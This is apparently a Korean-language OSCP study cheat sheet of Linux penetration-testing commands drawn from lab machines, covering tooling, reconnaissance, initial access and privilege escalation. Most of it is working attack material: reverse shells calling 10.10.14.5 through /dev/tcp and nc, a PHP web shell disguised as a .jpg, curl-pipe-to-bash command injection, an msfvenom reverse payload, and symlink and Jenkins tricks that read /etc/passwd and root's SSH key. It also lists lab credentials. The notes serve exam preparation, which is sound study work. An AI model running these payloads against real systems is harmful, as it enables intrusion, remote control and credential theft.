#OSCP Linux


## 진단 도구

### keepass
```
git clone https://github.com/vdohney/keepass-password-dumper.git

cd keepass-password-dumper
dotnet run ../KeePassDumpFull.dmp

# 만약 dotnet-sdk-7.0 버전이 없다면 설치

# Microsoft 패키지 등록
wget https://packages.microsoft.com/config/debian/11/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb

# 시스템 업데이트 및 .NET 7 SDK 설치
sudo apt update
sudo apt install -y dotnet-sdk-7.0
```

### kpcli
```
sudo apt-get install kpcli -y
kpcli
```
```
open passcodes.kdbx
show 0 -f
```

### git
```
git clone https://github.com/arthaud/git-dumper.git
```

### linpeas.sh
```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

### revshells.com
```
https://www.revshells.com/
```

### python 가상환경
```
python -m venv env
source env/bin/activate
pip install -r requirements.txt
pip install git_dumper

# 가상환경 빠져나오기
deactivate
```

### dunc-bypasser
```
git clone https://github.com/teambi0s/dfunc-bypasser.git
```

<br>

---

## 정보수집


### nmap
```
# UDP 스캔
sudo nmap -sU --top-ports 10 -sV 10.10.11.248
```

### DB접근
```
# postgres
psql -h 127.0.0.1 -U postgres

\list

\connect cozyhosting

\dt

select * from users;
```

### 비밀번호 추출
```
hashcat admin_hash -m 3200 /usr/share/wordlists/rockyou.txt
```

### 파일 복사 & 가져오기
```
# 목표대상의 경로에서 칼리 현재 경로로 파일 복사해서 가져오기
scp pinocure@10.10.11.227:/home/lnorgaard/RT30000.zip .
```

### robots.txt

### ffuf
```
# 서브도메인
ffuf -w /usr/share/amass/wordlists/bitquark_subdomains_top100K.txt -H "Host:FUZZ.pinocure.com" -u http://pinocure.com/ -ic -fs 230
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://dev.pinocure.com/FUZZ -ic -t 20
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://pinocure.com/ -H 'Host: FUZZ.pinocure.com' -fs 15949
ffuf -u http://pinocure.com -H "Host: FUZZ.pinocure.com" -w /usr/share/wordlists/subdomains.txt -fs 1131

# ic : 대소문자 무시 응답 필터링, fc : 응답 크기 230인거 무시, t : 동시에 요청을 보낼 스레드 개수 지정
```

### john
```
john hash -w=/usr/share/wordlists/rockyou.txt
```

### snmpwalk
```
snmpwalk -v 2c -c public pinocure.com
snmpwalk -v 1 -c public 10.10.11.136
```
```
curl -XPOST -k -L 'http://pinocure.com/nagiosxi/api/v1/authenticate' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=60' | jq
```

### python 서버
```
sudo python3 -m http.server 3000
```

### gobuster
```
gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -e -t 100 -u http://pinocure.com -b 403,404
gobuster dir -u http://pinocure.com/ -w /usr/share/wordlists/dirb/common.txt
```

### curl
```
curl -X POST http://intentions.htb/api/v2/auth/login
curl -X POST http://intentions.htb/api/v1/auth/login
curl -d 'email=steve@pinocure.com&hash=$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa' -X POST http://pinocure.com/api/v2/auth/login
```

### 파일 형식 변경
```
zip info.zip info.php
chmod 777 info.zip
mv info.zip info.txt
```


<br>


---

## 초기침투


### full tty
```
script /dev/null -c bash
```

### rev shell
```
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/{ip}/{port} 0>&1' > rev.sh
echo "bash -i >& /dev/tcp/{ip}/{port} 0>&1" > /tmp/shell.sh
```
```
<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4455 >/tmp/f");?>
```
```
/bin/bash -i >& /dev/tcp/10.10.14.5/9001 0>&1
```

### rev shell upload & command
```
test;curl${IFS}http://ip:port/rev.sh|bash;
http://pinocure.com/storage/rce.php?c=curl%2010.10.14.5/shell|bash
```
```
echo '<?php system($_GET["ruang"]); ?>' > shell.jpg
```

### ssh
```
chmod 600 id_rsa

ssh root@pinocure -i id_rsa

ssh pinocure@10.10.11.227

cat /etc/ssh/sshd_config | grep -E 'PermitRootLogin|PubkeyAuthentication'
```

### ssh Local Port Forwading
```
ssh -L 8080:localhost:80 pinocure@10.10.11.136
```

### msfvenom
```
msfvenom -p php/reverse_php LHOST=10.10.14.34 LPORT=4444 -f raw > shell.php
```

### git
```
python3 git_dumper.py http://dev.pinocure.com gitdump

# 유저 정보 수집
git status
git restore --staged . && git diff
git log
git log -p
git log -p | grep -i password
git show {commitID}
```
```
git-dumper http://pinocure.com/dev/.git dev
```

### symbolic
```
mkdir -p exploit/content/images/
ln -s /etc/passwd exploit/content/images/test-file.png

# -r : 재귀적 압축, -y : 링크 자체로 저장
zip -r -y exploit.zip exploit/

curl http://pinocure.com/content/images/test-file.png
```
```
ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
```
```
touch @id_rsa
ln -s /root/.ssh/id_rsa id_rsa
```

### jenkins
```
sudo java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help "@/etc/passwd"
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help "@/proc/self/environ"
```
```
# pipeline
pipeline {
    agent any
    stages {
        stage('SSH') {
            steps {
                script {
                    sshagent(credentials: ['1']) {
                        sh 'ssh -o StrictHostKeyChecking=no root@10.10.11.10 "cat /root/.ssh/id_rsa"'
                    }
                }
            }
    	}
    }
}
```

### podman
```
podman pull docker.io/jenkins/jenkins:lts-jdk17
docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17
```

### RCE
```
/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
```

### 파일 다운 & 실행
```
curl http://10.10.14.5:3000/linpeas.sh | bash
```

### 업로드 웹 쉘 실행
```
python dfunc-bypasser.py --url 'http://dev.pinocure.com/?page=phar://uploads/1f8dadc0c349cde81b339f14beb0050c/info.txt/info'
```


<br>


---

## 권한상승

### sudo
```
sudo -l

sudo /usr/bin/ssh -v -o PermitLocalCommand=yes -o 'LocalCommand=/bin/bash' pinocure@127.0.0.1
sudo /usr/bin/systemctl status pinocure.service
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'
```

### PuttyGen
```
puttygen ssh_key -O private-openssh -o id_rsa
```

### while 반복문
```
# key.png가 root인증서 가리키도록 무한 반복 실행
# sf : 심볼릭 링크를 만들고 이미 해당 이름의 링크나 파일이 존재하면 강제로 덮어쓰기
while true;do ln -sf /root/.ssh/id_rsa /var/quarantined/key.png;done
```

### getcap
```
getcap /opt/scanner/scanner
```

### ss, ps, pinocure
```
# ss
ss -tlpn
```
```
# ps
ps aux
```
```
# find
find / -name pinocure.service 2>/dev/null
```




















